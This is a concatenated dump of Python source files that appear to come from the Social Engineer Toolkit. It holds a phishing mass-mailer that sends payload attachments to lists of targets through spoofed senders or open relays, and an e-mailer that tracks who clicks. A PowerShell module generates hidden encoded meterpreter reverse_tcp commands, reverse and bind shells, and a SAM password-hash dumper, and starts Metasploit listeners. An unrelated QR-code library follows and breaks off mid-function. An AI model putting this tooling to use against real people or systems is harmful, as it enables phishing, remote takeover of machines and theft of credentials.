                if not os.path.isfile("/etc/init.d/sendmail"):
                    pause=raw_input("[!] Sendmail was not found. Install it and try again. (For Kali: apt-get install sendmail-bin)")
                    sys.exit()
                smtp = ("localhost")
                port = ("25")
                # Flip sendmail switch to get rid of some questions
                sendmail=1
                # just throw user and password to blank, needed for defining below
                provideruser=''
                pwd=''

    # Search for SMTP provider we will be using
    match1=re.search("EMAIL_PROVIDER=", line)
    if match1:

        # if we hit on EMAIL PROVIDER
        email_provider=line.replace("EMAIL_PROVIDER=", "").lower()

        # support smtp for gmail
        if email_provider == "gmail":
            if sendmail == 0:
                smtp = ("smtp.gmail.com")
                port = ("587")

        # support smtp for yahoo
        if email_provider == "yahoo":
            if sendmail == 0:
                smtp = ("smtp.mail.yahoo.com")
                port = ("25")

        # support smtp for hotmail
        if email_provider == "hotmail":
            if sendmail == 0:
                smtp = ("smtp.hotmail.com")
                port = ("25")

# DEFINE METASPLOIT PATH
meta_path=meta_path()

print_info("As an added bonus, use the file-format creator in SET to create your attachment.")
counter=0
# PDF Previous
if os.path.isfile(setdir + "/template.pdf"):
    if os.path.isfile(setdir + "/template.rar"):
        if os.path.isfile(setdir + "/template.zip"):
            print_warning("Multiple payloads were detected:")
            print ("1. PDF Payload\n2. VBS Payload\n3. Zipfile Payload\n\n")
            choose_payload=raw_input(setprompt("0", ""))
            if choose_payload=='1': file_format=(setdir + "/template.pdf")
            if choose_payload=='2': file_format=(setdir + "/template.rar")
            if choose_payload=='3': file_format=(setdir + "/template.zip")
            counter=1
if counter==0:
    if os.path.isfile(setdir + "/template.pdf"): file_format=(setdir + "/template.pdf")
    if os.path.isfile(setdir + "/template.rar"): file_format=(setdir + "/template.rar")
    if os.path.isfile(setdir + "/template.zip"): file_format=(setdir + "/template.zip")
    if os.path.isfile(setdir + "/template.doc"): file_format=(setdir + "/template.doc")
    if os.path.isfile(setdir + "/template.rtf"): file_format=(setdir + "/template.rtf")
    if os.path.isfile(setdir + "/template.mov"): file_format=(setdir + "/template.mov")

# Determine if prior payload created
if not os.path.isfile(setdir + "/template.pdf"):
    if not os.path.isfile(setdir + "/template.rar"):
        if not os.path.isfile(setdir + "/template.zip"):
            if not os.path.isfile(setdir + "/template.doc"):
                if not os.path.isfile(setdir + "/template.rtf"):
                    if not os.path.isfile(setdir + "/template.mov"):
                        print "No previous payload created."
                        file_format=raw_input(setprompt(["1"], "Enter the file to use as an attachment"))
                        if not os.path.isfile("%s" % (file_format)):
                            while 1:
                                print_error("ERROR:FILE NOT FOUND. Try Again.")
                                file_format=raw_input(setprompt(["1"], "Enter the file to use as an attachment"))
                                if os.path.isfile(file_format):
                                    break

# if not found exit out
if not os.path.isfile(file_format):
    exit_set()

print """
   Right now the attachment will be imported with filename of 'template.whatever'

   Do you want to rename the file?

   example Enter the new filename: moo.pdf

    1. Keep the filename, I don't care.
    2. Rename the file, I want to be cool.
"""
filename1=raw_input(setprompt(["1"], ""))
if filename1 == '1' or filename1 == '':
    print_status("Keeping the filename and moving on.")
if filename1 == '2':
    filename1=raw_input(setprompt(["1"], "New filename"))
    subprocess.Popen("cp %s %s/%s 1> /dev/null 2> /dev/null" % (file_format,setdir,filename1), shell=True).wait()
    file_format=("%s/%s" % (setdir,filename1))
    print_status("Filename changed, moving on...")

print ("""
   Social Engineer Toolkit Mass E-Mailer

   There are two options on the mass e-mailer, the first would
   be to send an email to one individual person. The second option
   will allow you to import a list and send it to as many people as
   you want within that list.

   What do you want to do:

   1.  E-Mail Attack Single Email Address
   2.  E-Mail Attack Mass Mailer

   99. Return to main menu.
   """)
option1 = raw_input(setprompt(["1"], ""))

if option1 == '1' or option1 == '2':

    print ("""
   Do you want to use a predefined template or craft
   a one time email template.

   1. Pre-Defined Template
   2. One-Time Use Email Template
""")
    template_choice = raw_input(setprompt(["1"], ""))
    # if predefined template go here
    if template_choice == '1':
        # set path for
        path = 'src/templates/'
        filewrite=file(setdir + "/email.templates", "w")
        counter=0
        # Pull all files in the templates directory
        for infile in glob.glob(os.path.join(path, '*.template')):
            infile=infile.split("/")
            # grab just the filename
            infile=infile[2]
            counter=counter+1
            # put it in a format we can use later in a file
            filewrite.write(infile+" "+str(counter)+"\n")
        # close the file
        filewrite.close()
        # read in formatted filenames
        fileread=file(setdir + "/email.templates","r").readlines()
        print_info("Available templates:")
        for line in fileread:
            line=line.rstrip()
            line=line.split(" ")
            filename=line[0]
            # read in file
            fileread2=file("src/templates/%s" % (filename),"r").readlines()
            for line2 in fileread2:
                match=re.search("SUBJECT=", line2)
                if match:
                    line2=line2.rstrip()
                    line2=line2.split("=")
                    line2=line2[1]
                    # strip double quotes
                    line2=line2.replace('"', "")
                    # display results back
                    print line[1]+": "+line2
        # allow user to select template
        choice=raw_input(setprompt(["1"], ""))
        for line in fileread:
            # split based off of space
            line=line.split(" ")
            # search for the choice
            match=re.search(str(choice), line[1])
            if match:
                # print line[0]
                extract=line[0]
                fileopen=file("src/templates/"+str(extract), "r").readlines()
                for line2 in fileopen:
                    match2=re.search("SUBJECT=", line2)
                    if match2:
                        subject=line2.replace('"', "")
                        subject=subject.split("=")
                        subject=subject[1]
                    match3=re.search("BODY=", line2)
                    if match3:
                        body=line2.replace('"', "")
                        body=body.replace(r'\n', " \n ")
                        body=body.split("=")
                        body=body[1]
    if template_choice == '2' or template_choice == '':
        subject=raw_input(setprompt(["1"], "Subject of the email"))
        try:
            html_flag=raw_input(setprompt(["1"], "Send the message as html or plain? 'h' or 'p' [p]"))
            if html_flag == "" or html_flag == "p":
                message_flag="plain"
            if html_flag == "h":
                message_flag="html"
            body = ""
            body=raw_input(setprompt(["1"], "Enter the body of the message, hit return for a new line. Control+c when finished"))
            while 1:
                try:
                    body+=("\n")
                    body+=raw_input("Next line of the body: ")
                except KeyboardInterrupt:
                    break
        except KeyboardInterrupt:
            pass

# single email
if option1 == '1':
    to = raw_input(setprompt(["1"], "Send email to"))

# mass emailer
if option1 == '2':
    print ("""
 The mass emailer will allow you to send emails to multiple
 individuals in a list. The format is simple, it will email
 based off of a line. So it should look like the following:

 john.doe@ihazemail.com
 jane.doe@ihazemail.com
 wayne.doe@ihazemail.com

 This will continue through until it reaches the end of the
 file. You will need to specify where the file is, for example
 if its in the SET folder, just specify filename.txt (or whatever
 it is). If its somewhere on the filesystem, enter the full path,
 for example /home/relik/ihazemails.txt
""")
    filepath = raw_input(setprompt(["1"], "Path to the file to import into SET"))

# exit mass mailer menu
if option1 == '99':
    exit_set()

print ("""\n  1. Use a %s Account for your email attack.\n  2. Use your own server or open relay\n""" % (email_provider))
relay = raw_input(setprompt(["1"], ""))
counter=0
# Specify SMTP Option Here
if relay == '1':
    provideruser = raw_input(setprompt(["1"], ("Your %s email address" % email_provider)))
    from_address = provideruser
    from_displayname = raw_input(setprompt(["1"], "The FROM NAME user will see: "))
    pwd = getpass.getpass("Email password: ")

# Specify Open-Relay Option Here
if relay == '2':
    from_address = raw_input(setprompt(["1"], "From address (ex: moo@example.com)"))
    from_displayname = raw_input(setprompt(["1"], "The FROM NAME user will see: "))
    if sendmail==0:
        # Ask for a username and password if we aren't using sendmail
        provideruser = raw_input(setprompt(["1"], "Username for open-relay [blank]"))
        pwd =  getpass.getpass("Password for open-relay [blank]: ")

    if sendmail==0:
        smtp = raw_input(setprompt(["1"], "SMTP email server address (ex. smtp.youremailserveryouown.com)"))
        port = raw_input(setprompt(["1"], "Port number for the SMTP server [25]"))
        if port == "":
            port = ("25")

# specify if its a high priority or not
highpri = yesno_prompt(["1"], "Flag this message/s as high priority? [yes|no]")
if not "YES" in highpri:
    prioflag1 = ""
    prioflag2 = ""
else:
    prioflag1 = ' 1 (Highest)'
    prioflag2 = ' High'

# Define mail send here
def mail(to, subject, text, attach, prioflag1, prioflag2):
    msg = MIMEMultipart()
    msg['From'] = from_displayname
    msg['To'] = to
    msg['X-Priority'] = prioflag1
    msg['X-MSMail-Priority'] = prioflag2
    msg['Subject'] = subject
    # specify if its html or plain
    # body message here
    body_type=MIMEText(text, "%s" % (message_flag))
    msg.attach(body_type)
    # define connection mimebase
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(open(attach, 'rb').read())
    # base 64 encode message mimebase
    Encoders.encode_base64(part)
    # add headers
    part.add_header('Content-Disposition','attachment; filename="%s"' % os.path.basename(attach))
    msg.attach(part)
    # define connection to smtp server
    mailServer = smtplib.SMTP(smtp, int(port))
    mailServer.ehlo()
    # send ehlo to smtp server
    if sendmail == 0:
        if email_provider == "gmail":
            mailServer.ehlo()
            # start TLS for gmail sometimes needed
            try:
                mailServer.starttls()
            except: pass
            mailServer.ehlo()
    if counter == 0:
        try:
            if email_provider == "gmail":
                try:
                    mailServer.starttls()
                except:
                    pass
                mailServer.ehlo()
                if len(provideruser) > 0:
                    mailServer.login(provideruser, pwd)
                mailServer.sendmail(from_address, to, msg.as_string())
        except Exception, e:
            print_error("Unable to deliver email. Printing exceptions message below, this is most likely due to an illegal attachment. If using GMAIL they inspect PDFs and is most likely getting caught.")
            raw_input("Press {return} to view error message.")
            print str(e)
            try:
                mailServer.docmd("AUTH LOGIN", base64.b64encode(provideruser))
                mailServer.docmd(base64.b64encode(pwd), "")
            except Exception,e:
                print str(e)
                try:
                    mailServer.login(provideremail, pwd)
                    thread.start_new_thread(mailServer.sendmail(from_address, to, msg.as_string()))
                except Exception, e:
                    return_continue()

    if email_provider == "yahoo" or email_provider == "hotmail":
        mailServer.login(provideruser, pwd)
        thread.start_new_thread(mailServer.sendmail,(from_address, to, msg.as_string()))

    if sendmail == 1:
        thread.start_new_thread(mailServer.sendmail,(from_address, to, msg.as_string()))

if option1 == '1':
    try:
        mail("%s" % (to), subject, body, "%s" % (file_format), prioflag1, prioflag2)
    except socket.error:
        print_status("Unable to connect to mail server. Try again (Internet issues?)")

if option1 == '2':
    counter=0
    email_num=0
    fileopen=file(filepath, "r").readlines()
    for line in fileopen:
        to = line.rstrip()
        mail("%s" % (to),
        subject,
        body,
        "%s" % (file_format), prioflag1, prioflag2)
        email_num=email_num+1
        print "   Sent e-mail number: " + (str(email_num))

if not os.path.isfile(setdir + "/template.zip"):
    print_status("SET has finished delivering the emails")
    question1 = yesno_prompt(["1"], "Setup a listener [yes|no]")
    if question1 == 'YES':
        if not os.path.isfile(setdir + "/payload.options"):
            if not os.path.isfile(setdir + "/meta_config"):
                if not os.path.isfile(setdir + "/unc_config"):
                    print_error("Sorry, you did not generate your payload through SET, this option is not supported.")
        if os.path.isfile(setdir + "/unc_config"):
            child=pexpect.spawn("ruby %s/msfconsole -L -r %s/unc_config" % (meta_path,setdir))
            try: child.interact()
            except Exception: child.close()

        if os.path.isfile(setdir + "/payload.options"):
            fileopen=file(setdir + "/payload.options","r").readlines()
            for line in fileopen:
                line=line.rstrip()
                line=line.split(" ")

            # CREATE THE LISTENER HERE
            filewrite=file(setdir + "/meta_config", "w")
            filewrite.write("use exploit/multi/handler\n")
            filewrite.write("set PAYLOAD "+line[0]+"\n")
            filewrite.write("set LHOST "+line[1]+"\n")
            filewrite.write("set LPORT "+line[2]+"\n")
            filewrite.write("set ENCODING shikata_ga_nai\n")
            filewrite.write("set ExitOnSession false\n")
            filewrite.write("exploit -j\n\n")
            filewrite.close()
            child=pexpect.spawn("ruby %s/msfconsole -L -r %s/meta_config" % (meta_path,setdir))
            try:
                child.interact()
            except Exception:
                child.close()

########NEW FILE########
__FILENAME__ = smtp_web
#!/usr/bin/env python
import smtplib
import os
import getpass
import sys
import thread
import subprocess
import re
import glob
import random
import time
import base64
from email.MIMEMultipart import MIMEMultipart
from email.MIMEBase import MIMEBase
from email.MIMEText import MIMEText
from email import Encoders

# default the email messages to plain text
# unless otherwise specified
message_flag="plain"

# impor the core modules
from src.core.setcore import *

# do we want to track the users that click links
track_email = check_config("TRACK_EMAIL_ADDRESSES=").lower()

definepath = os.getcwd()

# DEFINE SENDMAIL CONFIG and WEB ATTACK
sendmail=0

sendmail_file=file("%s/config/set_config" % (definepath),"r").readlines()
for line in sendmail_file:
    # strip carriage returns
    line=line.rstrip()
    match=re.search("SENDMAIL=",line)
    if match:
        # if match and if line is flipped on continue on
        if line == ("SENDMAIL=ON"):
            print_info("Sendmail is a Linux based SMTP Server, this can be used to spoof email addresses.")
            print_info("Sendmail can take up to three minutes to start")
            print_status("Sendmail is set to ON")
            sendmail_choice = yesno_prompt(["1"], "Start Sendmail? [yes|no]")
            # if yes, then do some good stuff
            if sendmail_choice == "YES":
                print_info("Sendmail can take up to 3-5 minutes to start")
                if os.path.isfile("/etc/init.d/sendmail"):
                    subprocess.Popen("/etc/init.d/sendmail start", shell=True).wait()
                if not os.path.isfile("/etc/init.d/sendmail"):
                    pause = raw_input("[!] Sendmail was not found. Try again and restart. (For Kali - apt-get install sendmail-bin)")
                    sys.exit()
                smtp = ("localhost")
                port = ("25")
                # Flip sendmail switch to get rid of some questions
                sendmail=1
                # just throw provideruser and password to blank, needed for defining below
                provideruser=''
                pwd=''

    # Search for SMTP provider we will be using
    match1=re.search("EMAIL_PROVIDER=", line)
    if match1:

        # if we hit on EMAIL PROVIDER
        email_provider=line.replace("EMAIL_PROVIDER=", "").lower()

        # support smtp for gmail
        if email_provider == "gmail":
            if sendmail == 0:
                smtp = ("smtp.gmail.com")
                port = ("587")

        # support smtp for yahoo
        if email_provider == "yahoo":
            if sendmail == 0:
                smtp = ("smtp.mail.yahoo.com")
                port = ("25")

        # support smtp for hotmail
        if email_provider == "hotmail":
            if sendmail == 0:
                smtp = ("smtp.hotmail.com")
                port = ("25")


print ("""
   Social Engineer Toolkit Mass E-Mailer

   There are two options on the mass e-mailer, the first would
   be to send an email to one individual person. The second option
   will allow you to import a list and send it to as many people as
   you want within that list.

   What do you want to do:

    1.  E-Mail Attack Single Email Address
    2.  E-Mail Attack Mass Mailer

    99. Return to main menu.
   """)

option1=raw_input(setprompt(["5"], ""))

if option1 == 'exit':
    exit_set()

# single email
if option1 == '1':
    to = raw_input(setprompt(["1"], "Send email to"))

# mass emailer
if option1 == '2':
    print ("""
  The mass emailer will allow you to send emails to multiple
  individuals in a list. The format is simple, it will email
  based off of a line. So it should look like the following:

  john.doe@ihazemail.com
  jane.doe@ihazemail.com
  wayne.doe@ihazemail.com

  This will continue through until it reaches the end of the
  file. You will need to specify where the file is, for example
  if its in the SET folder, just specify filename.txt (or whatever
  it is). If its somewhere on the filesystem, enter the full path,
  for example /home/relik/ihazemails.txt
 """)
    filepath = raw_input(setprompt(["1"], "Path to the file to import into SET"))
    if not os.path.isfile(filepath):
        while 1:
            print "[!] File not found! Please try again and enter the FULL path to the file."
            filepath = raw_input(setprompt(["1"], "Path to the file to import into SET"))
            if os.path.isfile(filepath):
                break

# exit mass mailer menu
if option1 == '99':
    print "Returning to main menu..."

if option1 != "99":
    print ("""\n  1. Use a %s Account for your email attack.\n  2. Use your own server or open relay\n""" % (email_provider))
    relay = raw_input(setprompt(["1"], ""))

    counter=0
    # Specify mail Option Here
    if relay == '1':
        provideruser = raw_input(setprompt(["1"], "Your %s email address" % (email_provider)))
	from_address = provideruser
        from_displayname = raw_input(setprompt(["1"], "The FROM NAME the user will see"))
        pwd = getpass.getpass("Email password: ")

    # Specify Open-Relay Option Here    
    if relay == '2':
        from_address = raw_input(setprompt(["1"], "From address (ex: moo@example.com)"))
        from_displayname = raw_input(setprompt(["1"], "The FROM NAME the user will see"))
        if sendmail==0:
            # Ask for a username and password if we aren't using sendmail
            provideruser = raw_input(setprompt(["1"], "Username for open-relay [blank]"))
            pwd =  getpass.getpass("Password for open-relay [blank]: ")

        if sendmail==0:
            smtp = raw_input(setprompt(["1"], "SMTP email server address (ex. smtp.youremailserveryouown.com)"))
            port = raw_input(setprompt(["1"], "Port number for the SMTP server [25]"))
            if port == "":
                port = ("25")

    # specify if its a high priority or not
    highpri=yesno_prompt(["1"], "Flag this message/s as high priority? [yes|no]")
    if not "YES" in highpri:
        prioflag1 = ""
        prioflag2 = ""
    else:
        prioflag1 = ' 1 (Highest)'
        prioflag2 = ' High'

    subject=raw_input(setprompt(["1"], "Email subject"))
    try:
        html_flag=raw_input(setprompt(["1"], "Send the message as html or plain? 'h' or 'p' [p]"))

        # if we are specifying plain or defaulting to plain
        if html_flag == "" or html_flag == "p":
            message_flag="plain"
        # if we are specifying html
        if html_flag == "h":
            message_flag="html"
        # start the body off blank
        body = ""
        ## Here we start to check if we want to track users when they click
        ## essentially if this flag is turned on, a quick search and replace
        ## occurs via base64 encoding on the user name. that is then added
        ## during the def mail function call and the username is posted as
        ## part of the URL. When we check the users, they can be coorelated
        ## back to the individual user when they click the link.

        # track email is pulled dynamically from the config as TRACK_EMAIL_ADDRESSES
        if track_email.lower() == "on":
            print "You have specified to track user email accounts when they are sent. In"
            print "order for this to work, you will need to specify the URL within the body"
            print "of the email and where you would like to inject the base64 encoded name."
            print "\nWhen a user clicks on the link, the URL Will post back to SET and track"
            print "each of the users clicks and who the user was. As an example, say my SET"
            print "website is hosted at http://www.trustedsec.com/index.php and I want to track users."
            print "I would type below " + bcolors.BOLD + "http://www.trustedsec.com/index.php?INSERTUSERHERE" + bcolors.ENDC + ". Note that in"
            print "order for SET to work, you will need to specify index.php?INSERTUSERHERE. That is the"
            print "keyword that SET uses in order to replace the base name with the URL."
            print "\nInsert the FULL url and the " + bcolors.BOLD + "INSERTUSERHERE" + bcolors.ENDC + "on where you want to insert the base64 name.\n\nNOTE: You must have a index.php and a ? mark seperating the user. YOU MUST USE PHP!"
            print "\nNote that the actual URL does NOT need to contain index.php but has to be named that for the php code in Apache to work."
        print_warning("IMPORTANT: When finished, type END (all capital) then hit {return} on a new line.")
        body=raw_input(setprompt(["1"], "Enter the body of the message, type END (capitals) when finished"))

        # loop through until they are finished with the body of the subject line
        while body != 'exit':
            try:
    
                body+=("\n")
                body_1 = raw_input("Next line of the body: ")
                if body_1 == "END":
                    break
                else:
                    body = body + body_1

            # except KeyboardInterrupts (control-c) and pass through.
            except KeyboardInterrupt:
                break

        # if we are tracking emails, this is some cleanup and detection to see if they entered .html instead or didn't specify insertuserhere
        if track_email.lower() == "on":
            # here we replace url with .php if they made a mistake
            body = body.replace(".html", ".php")
            if not "?INSERTUSERHERE" in body:
                print_error("You have track email to on however did not specify ?INSERTUSERHERE.")
                print_error("Tracking of users will not work and is disabled. Please re-read the instructions.")
                pause = raw_input("Press {" + bcolors.BOLD + "return" + bcolors.ENDC + "} to continue.")


    # except KeyboardInterrupts (control-c) and pass through.
    except KeyboardInterrupt:
        pass

def mail(to, subject, prioflag1, prioflag2, text):

    msg = MIMEMultipart()
    msg['From'] = from_displayname
    msg['To'] = to
    msg['X-Priority'] = prioflag1
    msg['X-MSMail-Priority'] = prioflag2
    msg['Subject'] = subject

    body_type=MIMEText(text, "%s" % (message_flag))
    msg.attach(body_type)

    mailServer = smtplib.SMTP(smtp, port)

    if sendmail == 0:

        if email_provider == "gmail":
            try:
                mailServer.starttls()
            except:
                pass
                mailServer.ehlo()

            else: mailServer.ehlo()

    try:
        if provideruser != "" or pwd != "":
            mailServer.login(provideruser, pwd)
            mailServer.sendmail(from_address, to, msg.as_string())

    except:
        # try logging in with base64 encoding here
        import base64
        try:
            mailServer.docmd("AUTH LOGIN", base64.b64encode(provideruser))
            mailServer.docmd(base64.b64encode(pwd), "")

        # except exceptions and print incorrect passowrd
        except Exception, e:
            print_warning("It appears your password was incorrect.\nPrinting response: "+(str(e)))
            return_continue()

    if sendmail == 1:
        mailServer.sendmail(from_address, to, msg.as_string())

# if we specified a single address
if option1 == '1':
    # re-assign body to temporary variable to not overwrite original body
    body_new = body
    ## if we specify to track users, this will replace the INSERTUSERHERE with the "TO" field.
    if track_email.lower() == "on":
        body_new = body_new.replace("INSERTUSERHERE", base64.b64encode(to))
    # call the function to send email
    try:
        mail(to,subject,prioflag1,prioflag2,body_new)
    except socket.error:
        print_error("Unable to establish a connection with the SMTP server. Try again.")
        sys.exit()
    except KeyboardInterrupt:
        print_error("Control-C detected, exiting out of SET.")
        sys.exit()
    except Exception:
        print_error("Something went wrong.. Try again")
        sys.exit()

# if we specified the mass mailer for multiple users
if option1 == '2':
    email_num=0
    fileopen=file(filepath, "r").readlines()
    for line in fileopen:
        to = line.rstrip()
        # re-assign body to temporary variable to not overwrite original body
        body_new = body
        ## if we specify to track users, this will replace the INSERTUSERHERE with the "TO" field.
        if track_email.lower() == "on":
            body_new = body_new.replace("INSERTUSERHERE", base64.b64encode(to))
        # send the actual email
        time_delay = check_config("TIME_DELAY_EMAIL=").lower()
        time.sleep(int(time_delay))
        mail(to,subject,prioflag1,prioflag2,body_new)
        email_num=email_num+1
        # simply print the statement
        print_status("Sent e-mail number: " + (str(email_num)) + " to address: " + to)

if option1 != "99":
    # finish up here
    print_status("SET has finished sending the emails")
    return_continue()

########NEW FILE########
__FILENAME__ = powershell
#!/usr/bin/python
#
#
# handle powershell payloads and get them ready
#
#
#
from src.core.setcore import *
from src.core.menu import text

me = mod_name()

debug_msg(me, "printing 'text.powershell menu'",5)
show_powershell_menu = create_menu(text.powershell_text, text.powershell_menu)
powershell_menu_choice = raw_input(setprompt(["29"], ""))

if powershell_menu_choice != "99":
    # specify ipaddress of reverse listener
    ipaddr = grab_ipaddress()
    update_options("IPADDR=" + ipaddr)

    # if we select alphanumeric shellcode
    if powershell_menu_choice == "1":
        port = raw_input(setprompt(["29"], "Enter the port for the reverse [443]"))
        if port == "": port = "443"
        update_options("PORT=" + port)
        update_options("POWERSHELL_SOLO=ON")
        print_status("Prepping the payload for delivery and injecting alphanumeric shellcode...")

        filewrite = file(setdir + "/payload_options.shellcode", "w")
        filewrite.write("windows/meterpreter/reverse_tcp " + port + ",")
        filewrite.close()

        try: reload(src.payloads.powershell.prep)
        except: import src.payloads.powershell.prep
        # create the directory if it does not exist
        if not os.path.isdir(setdir + "/reports/powershell"):
            os.makedirs(setdir + "/reports/powershell")

        # here we format everything for us
        x86 = file(setdir + "/x86.powershell", "r")
        x86 = x86.read()
        x86 = "powershell -nop -windows hidden -noni -enc " + x86
        print_status("If you want the powershell commands and attack, they are exported to %s/reports/powershell/" % (setdir))
        filewrite = file(setdir + "/reports/powershell/x86_powershell_injection.txt", "w")
        filewrite.write(x86)
        filewrite.close()

        choice = yesno_prompt("0","Do you want to start the listener now [yes/no]: ")
        if choice == 'NO':
            pass

        # if we want to start the listener
        if choice == 'YES':
            filewrite = file(setdir + "/reports/powershell/powershell.rc", "w")
            filewrite.write("use multi/handler\nset payload windows/meterpreter/reverse_tcp\nset lport %s\nset LHOST 0.0.0.0\nexploit -j" % (port))
            filewrite.close()
            msf_path = meta_path()
            subprocess.Popen("ruby %s/msfconsole -L -r %s/reports/powershell/powershell.rc" % (msf_path, setdir), shell=True).wait()

        print_status("Powershell files can be found under %s/reports/powershell/" % (setdir))
        return_continue()

    # if we select powershell reverse shell
    if powershell_menu_choice == "2":

        # prompt for IP address and port
        port = raw_input(setprompt(["29"], "Enter the port for listener [443]"))
        # default to 443
        if port == "": port = "443"
        # open the reverse shell up
        print_status("Rewriting the powershell reverse shell with options")
        fileopen = file("src/powershell/reverse.powershell", "r")
        data = fileopen.read()
        data = data.replace("IPADDRHERE", ipaddr)
        data = data.replace("PORTHERE", port)
        print_status("Exporting the powershell stuff to %s/reports/powershell" % (setdir))
        # create the directory if it does not exist
        if not os.path.isdir(setdir + "/reports/powershell"):
            os.makedirs(setdir + "/reports/powershell")
        filewrite = file(setdir + "/reports/powershell/powershell.reverse.txt", "w")
        filewrite.write(data)
        filewrite.close()

        choice = yesno_prompt("0","Do you want to start a listener [yes/no]")
        if choice == "NO":
            print_status("Have netcat or standard socket listener on port %s" % (port))
        if choice == "YES":
            socket_listener(port)

        return_continue()

    # if we select powershell bind shell
    if powershell_menu_choice == "3":

        port = raw_input(setprompt(["29"], "Enter the port for listener [443]"))

        # open file
        fileopen = file("src/powershell/bind.powershell", "r")
        data = fileopen.read()
        data = data.replace("PORTHERE", port)
        # create the directory if it does not exist
        if not os.path.isdir(setdir + "/reports/powershell"):
            os.makedirs(setdir + "/reports/powershell")
        filewrite = file(setdir + "/reports/powershell/powershell.bind.txt", "w")
        filewrite.write(data)
        filewrite.close()
        print_status("The powershell program has been exported to %s/reports/powershell/" % (setdir))
        return_continue()


    # if we select powershell powerdump SAM dump
    if powershell_menu_choice == "4":

        # create the directory if it does not exist
        if not os.path.isdir(setdir + "/reports/powershell"):
            os.makedirs(setdir + "/reports/powershell")
        # copy file
        if os.path.isfile("src/powershell/powerdump.encoded"):
            shutil.copyfile("src/powershell/powerdump.encoded", setdir + "/reports/powershell/powerdump.encoded.txt")
        print_status("The powershell program has been exported to %s/reports/powershell/" % (setdir))
        print_status("Note with PowerDump -- You MUST be running as SYSTEM when executing.")
        return_continue()

########NEW FILE########
__FILENAME__ = qrcode
import math
from PIL import Image, ImageDraw

# QRCode for Python
#
# Ported from the Javascript library by Sam Curren
#
# QRCode for Javascript
# http://d-project.googlecode.com/svn/trunk/misc/qrcode/js/qrcode.js
#
# Copyright (c) 2009 Kazuhiko Arase
#
# URL: http://www.d-project.com/
#
# Licensed under the MIT license:
# http://www.opensource.org/licenses/mit-license.php
#
# The word "QR Code" is registered trademark of
# DENSO WAVE INCORPORATED
# http://www.denso-wave.com/qrcode/faqpatent-e.html


class QR8bitByte:

    def __init__(self, data):
        self.mode = QRMode.MODE_8BIT_BYTE
        self.data = data

    def getLength(self):
        return len(self.data)

    def write(self, buffer):
        for i in range(len(self.data)):
            #// not JIS ...
            buffer.put(ord(self.data[i]), 8)
    def __repr__(self):
        return self.data

class QRCode:
    def __init__(self, typeNumber, errorCorrectLevel):
        self.typeNumber = typeNumber
        self.errorCorrectLevel = errorCorrectLevel
        self.modules = None
        self.moduleCount = 0
        self.dataCache = None
        self.dataList = []
    def addData(self, data):
        newData = QR8bitByte(data)
        self.dataList.append(newData)
        self.dataCache = None
    def isDark(self, row, col):
        if (row < 0 or self.moduleCount <= row or col < 0 or self.moduleCount <= col):
            raise Exception("%s,%s - %s" % (row, col, self.moduleCount))
        return self.modules[row][col]
    def getModuleCount(self):
        return self.moduleCount
    def make(self):
        self.makeImpl(False, self.getBestMaskPattern() )
    def makeImpl(self, test, maskPattern):

        self.moduleCount = self.typeNumber * 4 + 17
        self.modules = [None for x in range(self.moduleCount)]

        for row in range(self.moduleCount):

            self.modules[row] = [None for x in range(self.moduleCount)]

            for col in range(self.moduleCount):
                self.modules[row][col] = None #//(col + row) % 3;

        self.setupPositionProbePattern(0, 0)
        self.setupPositionProbePattern(self.moduleCount - 7, 0)
        self.setupPositionProbePattern(0, self.moduleCount - 7)
        self.setupPositionAdjustPattern()
        self.setupTimingPattern()
        self.setupTypeInfo(test, maskPattern)

        if (self.typeNumber >= 7):
            self.setupTypeNumber(test)

        if (self.dataCache == None):
            self.dataCache = QRCode.createData(self.typeNumber, self.errorCorrectLevel, self.dataList)
        self.mapData(self.dataCache, maskPattern)

    def setupPositionProbePattern(self, row, col):

        for r in range(-1, 8):

            if (row + r <= -1 or self.moduleCount <= row + r): continue

            for c in range(-1, 8):

                if (col + c <= -1 or self.moduleCount <= col + c): continue

                if ( (0 <= r and r <= 6 and (c == 0 or c == 6) )
                        or (0 <= c and c <= 6 and (r == 0 or r == 6) )
                        or (2 <= r and r <= 4 and 2 <= c and c <= 4) ):
                    self.modules[row + r][col + c] = True;
                else:
                    self.modules[row + r][col + c] = False;

    def getBestMaskPattern(self):

        minLostPoint = 0
        pattern = 0

        for i in range(8):

            self.makeImpl(True, i);

            lostPoint = QRUtil.getLostPoint(self);

            if (i == 0 or minLostPoint > lostPoint):
                minLostPoint = lostPoint
                pattern = i

        return pattern

    def createMovieClip(self):
        raise Exception("Method not relevant to Python port")
    def makeImage(self):
        boxsize = 10 #pixels per box
        offset = 4 #boxes as border
        pixelsize = (self.getModuleCount() + offset + offset) * boxsize

        im = Image.new("RGB", (pixelsize, pixelsize), "white")
        d = ImageDraw.Draw(im)

        for r in range(self.getModuleCount()):
            for c in range(self.getModuleCount()):
                if (self.isDark(r, c) ):
                    x = (c + offset) * boxsize
                    y = (r + offset) * boxsize
                    b = [(x,y),(x+boxsize,y+boxsize)]
                    d.rectangle(b,fill="black")
        del d
        return im

    def setupTimingPattern(self):

        for r in range(8, self.moduleCount - 8):
            if (self.modules[r][6] != None):
                continue
            self.modules[r][6] = (r % 2 == 0)

        for c in range(8, self.moduleCount - 8):
            if (self.modules[6][c] != None):
                continue
            self.modules[6][c] = (c % 2 == 0)

    def setupPositionAdjustPattern(self):

        pos = QRUtil.getPatternPosition(self.typeNumber)

        for i in range(len(pos)):

            for j in range(len(pos)):

                row = pos[i]
                col = pos[j]

                if (self.modules[row][col] != None):
                    continue

                for r in range(-2, 3):

                    for c in range(-2, 3):

                        if (r == -2 or r == 2 or c == -2 or c == 2 or (r == 0 and c == 0) ):
                            self.modules[row + r][col + c] = True
                        else:
                            self.modules[row + r][col + c] = False

    def setupTypeNumber(self, test):

        bits = QRUtil.getBCHTypeNumber(self.typeNumber)

        for i in range(18):
            mod = (not test and ( (bits >> i) & 1) == 1)
            self.modules[i // 3][i % 3 + self.moduleCount - 8 - 3] = mod;

        for i in range(18):
            mod = (not test and ( (bits >> i) & 1) == 1)
            self.modules[i % 3 + self.moduleCount - 8 - 3][i // 3] = mod;

    def setupTypeInfo(self, test, maskPattern):

        data = (self.errorCorrectLevel << 3) | maskPattern
        bits = QRUtil.getBCHTypeInfo(data)

        #// vertical
        for i in range(15):

            mod = (not test and ( (bits >> i) & 1) == 1)

            if (i < 6):
                self.modules[i][8] = mod
            elif (i < 8):
                self.modules[i + 1][8] = mod
            else:
                self.modules[self.moduleCount - 15 + i][8] = mod

        #// horizontal
        for i in range(15):

